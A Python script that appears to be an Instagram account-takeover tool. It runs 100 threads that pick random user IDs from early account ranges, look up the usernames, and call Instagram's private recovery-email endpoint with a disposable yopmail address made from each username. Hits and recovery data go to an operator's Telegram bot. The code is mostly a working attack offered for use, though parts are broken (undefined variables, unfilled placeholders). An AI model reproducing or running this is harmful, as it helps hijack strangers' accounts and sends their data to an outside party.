import random
import requests
from asmix import Instagram
import os
import requests
from user_agent import generate_user_agent
from time import time
from hashlib import md5
from random import choice
from concurrent.futures import ThreadPoolExecutor
from cfonts import render, say
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import random
import base64
import re
import sys
from asmix import Instagram
import random
import string
import json
import requests
from threading import Thread
from rich.console import Console
Con = Console()
from concurrent.futures import ThreadPoolExecutor
executor = ThreadPoolExecutor(max_workers=30)
ID=input('Chat İD : ')
token= input ('Bot Token : ')
def rest(user):
  try:
    email=user+'@yopmail.com'
    headers = {
    	                        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }
  

        
        
        
        
    data = {
        f'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"' + email + '"}',
        'ig_sig_key_version': '4',
    }



            	
    respon = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
   
         
        
    	
    if '"status":"ok"' in respon:
    	print(f'good /@{user}  / {email}')
    	aa=Instagram.rest(user)
    	ff=f'''
    	email = {email}
    	rest = {aa}
    	'''
    	requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
    	
    else:
    	print(f'bad /@{user}  / {email}')
  
  except:
  	print('error')	

def Users():
    global Ex
    try:
        
        LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
       
        UseriD = str(random.randrange(iud,uid))
        
        variables = json.dumps({"id": UseriD, "render_surface": "PROFILE"})
        data = {"lsd": LsD, "variables": variables, "doc_id": "25618261841150840"}
        
        response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD}, data=data)
        
        
        user= response.json()['data']['user']['username']
        rest(user)
        
    
        return username
    except Exception as e:
        return None

print('''
1 -  2011
2 - 2012
3 - 2013
4 - 2014
5 - 2015
6 - 2016-2017
''')
num = int(input('Seç<=> : '))


if num == 1:
    uid = 18957417
    iud = 10000
elif num == 2:
    uid = 287924624
    iud = 183140
elif num == 3:
    uid = 461365132
    iud = 180165130
elif num == 4:
    iud = 361365132
    uid = 1682665388
elif num == 5:
    iud = 1682665388
    uid = 3382665388
elif num == 6:
    iud = 2682665388
    uid = 8682665388
else:
    exit()
def ExUsers():
    for _ in range(1000):  
        Users()

threads = []
for _ in range(100): 
    thread = Thread(target=ExUsers)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

Con.print(f"</> Users Extracted: [bold]{Ex}[/bold]")